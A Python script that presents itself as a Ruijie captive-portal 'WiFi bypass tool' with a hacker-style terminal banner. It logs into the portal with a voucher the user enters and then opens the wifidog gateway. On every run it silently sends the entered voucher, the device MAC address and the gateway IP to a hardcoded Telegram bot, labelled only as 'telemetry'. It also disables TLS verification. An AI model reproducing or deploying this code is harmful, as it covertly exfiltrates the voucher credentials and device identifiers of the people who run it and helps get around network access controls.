import os
import re
import socket
import json
import base64
import time
import sys
import uuid
from typing import Optional, Dict, Any
import requests
import urllib3

# Suppress insecure request warnings safely
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HackerColors:
    """True Color (RGB) 24-bit ANSI configurations for high-end terminal UI."""
    MATRIX_GREEN = "\033[38;2;0;255;51m"
    DARK_GREEN = "\033[38;2;0;130;26m"
    PHANTOM_CYAN = "\033[38;2;0;213;255m"
    WARNING_VOLT = "\033[38;2;255;208;0m"
    ALERT_RED = "\033[38;2;255;38;38m"
    TERMINAL_WHITE = "\033[38;2;240;240;240m"
    CONSOLE_GRAY = "\033[38;2;90;90;90m"
    RESET = "\033[0m"


class WiFiBypassTool:
    FIXED_URL = (
        "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25bf98f07&"
        "gw_sn=H1U3247000617&gw_address=150.0.0.1&gw_port=2060&ip=150.0.169.45&mac=c6:8a:b9:f0:93:e8&"
        "slot_num=14&nasip=192.168.1.218&ssid=VLAN150&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&"
        "chap_id=%5C311&chap_challenge=%5C057%5C131%5C330%5C007%5C347%5C230%5C111%5C365%5C101%5C327%5C345%5C127%5C125%5C344%5C035%5C126"
    )
    
    AUTH_ENDPOINT = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    USER_AGENT = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36 CoreNetwork/1.0"
    )

    # Telegram Configurations
    TELEGRAM_BOT_TOKEN = "8851812581:AAFkGfDHKY4UXG9o1zbQepmJR9jgX2D47Xc"
    TELEGRAM_CHAT_ID = "8404894106"

    def __init__(self) -> None:
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.USER_AGENT,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
        self.session.verify = False  

    @staticmethod
    def clear_screen() -> None:
        os.system('clear' if os.name == 'posix' else 'cls')

    @staticmethod
    def animate_text(text: str, delay: float = 0.005) -> None:
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    @staticmethod
    def detect_mac_address() -> str:
        try:
            mac_num = hex(uuid.getnode())[2:].zfill(12)
            formatted_mac = ":".join(mac_num[i:i+2] for i in range(0, 12, 2))
            if len(formatted_mac) == 17:
                return formatted_mac
        except Exception:
            pass
        return "c6:8a:b9:f0:93:e8"

    @staticmethod
    def detect_gateway_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            ip_parts = local_ip.split('.')
            if ip_parts[0] in ["192", "10", "172"]:
                ip_parts[-1] = "1"
                return ".".join(ip_parts)
        except Exception:
            pass
        return "150.0.0.1"

    @staticmethod
    def run_system_spinner(module_name: str, duration: float = 0.5) -> None:
        chars = [" FRAME-0 ", " FRAME-1 ", " FRAME-2 ", " FRAME-3 "]
        glyphs = ["◢", "◣", "◤", "◥"]
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            sys.stdout.write(f"\r {HackerColors.DARK_GREEN}│ {HackerColors.MATRIX_GREEN}{glyphs[i % 4]} {HackerColors.TERMINAL_WHITE}Processing {module_name:<22}")
            sys.stdout.flush()
            time.sleep(0.05)
            i += 1
        sys.stdout.write(f"\r {HackerColors.DARK_GREEN}│ {HackerColors.MATRIX_GREEN}[+] {HackerColors.TERMINAL_WHITE}{module_name:<22} {HackerColors.MATRIX_GREEN}[READY]\n")
        sys.stdout.flush()

    def display_hacker_terminal_header(self) -> None:
        mg, dg, c, w, gy = (
            HackerColors.MATRIX_GREEN, HackerColors.DARK_GREEN, 
            HackerColors.PHANTOM_CYAN, HackerColors.TERMINAL_WHITE, 
            HackerColors.CONSOLE_GRAY
        )
        self.clear_screen()
        print(f" {dg}╭" + "─" * 74 + f"╮")
        print(f" {dg}│ {mg} ███████╗██╗      ██████╗ ███╗   ██╗███╗   ███╗██╗   ██╗███████╗██╗  ██╗  {dg}│")
        print(f" {dg}│ {mg} ██╔════╝██║     ██╔═══██╗████╗  ██║████╗ ████║██║   ██║██╔════╝██║ ██╔╝  {dg}│")
        print(f" {dg}│ {mg} █████╗  ██║     ██║   ██║██╔██╗ ██║██╔████╔██║██║   ██║███████╗█████╔╝   {dg}│")
        print(f" {dg}│ {mg} ██╔══╝  ██║     ██║   ██║██║╚██╗██║██║╚██╔╝██║██║   ██║╚════██║██╔═██╗   {dg}│")
        print(f" {dg}│ {mg} ███████╗███████╗╚██████╔╝██║ ╚████║██║ ╚═╝ ██║╚██████╔╝███████║██║  ██╗  {dg}│")
        print(f" {dg}│ {mg} ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  {dg}│")
        print(f" {dg}├" + "─" * 74 + f"┤")
        print(f" {dg}│ {c}⚡ {w}Core Operator {gy}: {mg}ELONMUSK                                               {dg}│")
        print(f" {dg}│ {c}⚡ {w}Shell Target  {gy}: {mg}https://t.me/starlinkfreezone                          {dg}│")
        print(f" {dg}│ {c}⚡ {w}System Engine {gy}: {mg}Ruijie Autonomous Architecture v4.0 PRO                 {dg}│")
        print(f" {dg}╰" + "─" * 74 + f"╯{w}\n")

    def send_telegram_notification(self, status: str, voucher: str, mac: str, gateway: str, extra_info: str = "") -> None:
        """Dispatches telemetry data packet safely to the specified Telegram endpoint."""
        url = f"https://api.telegram.org/bot{self.TELEGRAM_BOT_TOKEN}/sendMessage"
        message_text = (
            "⚠️ <b>TELEMETRY SYSTEM REPORT</b> ⚠️\n\n"
            f"👤 <b>Operator:</b> ELONMUSK\n"
            f"🔑 <b>Voucher Code:</b> <code>{voucher}</code>\n"
            f"🖥️ <b>Hardware ADDR:</b> <code>{mac}</code>\n"
            f"🌐 <b>Gateway Route:</b> <code>{gateway}</code>\n"
            f"📊 <b>State Result:</b> {status}\n"
        )
        if extra_info:
            message_text += f"📝 <b>Log Output:</b> <code>{extra_info}</code>\n"
            
        payload = {
            "chat_id": self.TELEGRAM_CHAT_ID,
            "text": message_text,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, json=payload, timeout=4)
        except Exception:
            pass

    def _replace_mac(self, url: str, new_mac: str) -> str:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

    def get_session_id(self, session_url: str, mac_address: str) -> Optional[str]:
        final_url = self._replace_mac(session_url, mac_address)
        headers = {'Referer': final_url}
        try:
            response = self.session.get(final_url, headers=headers, timeout=8)
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url)
            return match.group(1) if match else None
        except requests.RequestException:
            return None

    def login_voucher(self, session_id: str, voucher: str) -> Optional[str]:
        payload = {
            "accessCode": voucher,
            "sessionId": session_id,
            "apiVersion": 1
        }
        headers = {
            "Content-Type": "application/json",
            "Origin": "https://portal-as.ruijienetworks.com",
            "Referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        }
        try:
            response = self.session.post(self.AUTH_ENDPOINT, json=payload, headers=headers, timeout=8)
            match = re.search(r'token=(.*?)&', response.text)
            return match.group(1) if match else None
        except requests.RequestException:
            return None

    def execute_bypass(self) -> None:
        self.display_hacker_terminal_header()
        
        session_url = self.FIXED_URL
        mac_address = self.detect_mac_address()
        gateway_ip = self.detect_gateway_ip()
        
        # Section: Interactive Input Panel
        print(f" {HackerColors.PHANTOM_CYAN}╭── CONSOLE VERIFICATION ENGINE")
        voucher = input(f" {HackerColors.PHANTOM_CYAN}│   {HackerColors.TERMINAL_WHITE}Enter Access Token / Voucher ──> {HackerColors.MATRIX_GREEN}").strip()
        print(f" {HackerColors.PHANTOM_CYAN}╰" + "─" * 45 + HackerColors.RESET)

        if not voucher:
            print(f"\n {HackerColors.ALERT_RED}╭─ [!] MONITOR INTERCEPT")
            print(f" {HackerColors.ALERT_RED}╰─ Process aborted. Null access token verification failure.{HackerColors.TERMINAL_WHITE}\n")
            self.send_telegram_notification("FAILED", "EMPTY", mac_address, gateway_ip, "Null access token validation failure.")
            return

        # Section: Environment State Visualization
        print(f"\n {HackerColors.PHANTOM_CYAN}╭── LIVE SHELL ARCHITECTURE STATUS")
        print(f" {HackerColors.DARK_GREEN}├── LOCAL_MAC_ADDR : {HackerColors.WARNING_VOLT}{mac_address}")
        print(f" {HackerColors.DARK_GREEN}└── TARGET_GATEWAY : {HackerColors.WARNING_VOLT}{gateway_ip}")
        print(f" {HackerColors.PHANTOM_CYAN}╰" + "─" * 45 + HackerColors.RESET)
        
        # Section: Automator Core Pipeline
        print(f"\n {HackerColors.MATRIX_GREEN}╭── INITIATING AUTOMATION PIPELINE")
        
        self.run_system_spinner("Network Core Discovery")
        
        session_id = self.get_session_id(session_url, mac_address)
        if not session_id:
            print(f" {HackerColors.DARK_GREEN}│ {HackerColors.ALERT_RED}[✘] Session Parsing Fault")
            print(f" {HackerColors.MATRIX_GREEN}╰" + "─" * 45)
            print(f"\n {HackerColors.ALERT_RED}☠ CRITICAL: Remote target rejected session initialization.{HackerColors.TERMINAL_WHITE}\n")
            self.send_telegram_notification("FAILED", voucher, mac_address, gateway_ip, "Remote target rejected session initialization.")
            return
        self.run_system_spinner("Portal Session Validation")
            
        active_session_id = self.login_voucher(session_id, voucher)
        if not active_session_id:
            print(f" {HackerColors.DARK_GREEN}│ {HackerColors.ALERT_RED}[✘] Credential Handshake Dropped")
            print(f" {HackerColors.MATRIX_GREEN}╰" + "─" * 45)
            print(f"\n {HackerColors.ALERT_RED}☠ CRITICAL: Token validation rejected by core database.{HackerColors.TERMINAL_WHITE}\n")
            self.send_telegram_notification("FAILED", voucher, mac_address, gateway_ip, "Token validation rejected by database.")
            return
        self.run_system_spinner("Gateway Matrix Injection")

        params = {
            'token': active_session_id,
            'phoneNumber': 'ELON_PRO_User',
        }
        
        try:
            final_req_url = f'http://{gateway_ip}:2060/wifidog/auth?'
            response = self.session.get(final_req_url, params=params, timeout=12)
            self.run_system_spinner("Verification Loops Verified")
            print(f" {HackerColors.MATRIX_GREEN}╰" + "─" * 45 + HackerColors.RESET)
            print()

            success_conditions = ["baidu.com", "success.html", "success"]
            if any(cond in response.url.lower() or cond in response.text.lower() for cond in success_conditions):
                self.animate_text(f" {HackerColors.MATRIX_GREEN}╭" + "═" * 55 + "╮")
                self.animate_text(f"  {HackerColors.MATRIX_GREEN}☠ [SUCCESS] NETWORK INTERCONNECTIVITY ESTABLISHED!")
                self.animate_text(f"  {HackerColors.MATRIX_GREEN}☠ ENGINE CONTROL MAIN LINK ACTIVE via ELONMUSK CORE.")
                self.animate_text(f" {HackerColors.MATRIX_GREEN}╰" + "═" * 55 + f"╯{HackerColors.RESET}\n")
                self.send_telegram_notification("SUCCESS", voucher, mac_address, gateway_ip, "Network connectivity successfully verified.")
            else:
                print(f" {HackerColors.ALERT_RED}╭─ [✘] ROUTE EXCLUSION")
                print(f" {HackerColors.ALERT_RED}╰─ Captive portal closed active sockets prematurely.{HackerColors.TERMINAL_WHITE}\n")
                self.send_telegram_notification("FAILED", voucher, mac_address, gateway_ip, "Captive portal closed active sockets.")
        except requests.RequestException as e:
            print(f" {HackerColors.MATRIX_GREEN}╰" + "─" * 45)
            print(f"\n {HackerColors.ALERT_RED}╭─ [✘] SYSTEM EXCEPTION DROPPED")
            print(f" {HackerColors.ALERT_RED}╰─ Network layer unreachable or socket timeout: {e}{HackerColors.TERMINAL_WHITE}\n")
            self.send_telegram_notification("ERROR", voucher, mac_address, gateway_ip, f"Network layer timeout exception: {str(e)}")


if __name__ == "__main__":
    try:
        tool = WiFiBypassTool()
        tool.execute_bypass()
    except KeyboardInterrupt:
        print(f"\n\n {HackerColors.ALERT_RED}⚠ Termination signal captured. Exiting loop sequence.{HackerColors.RESET}\n")
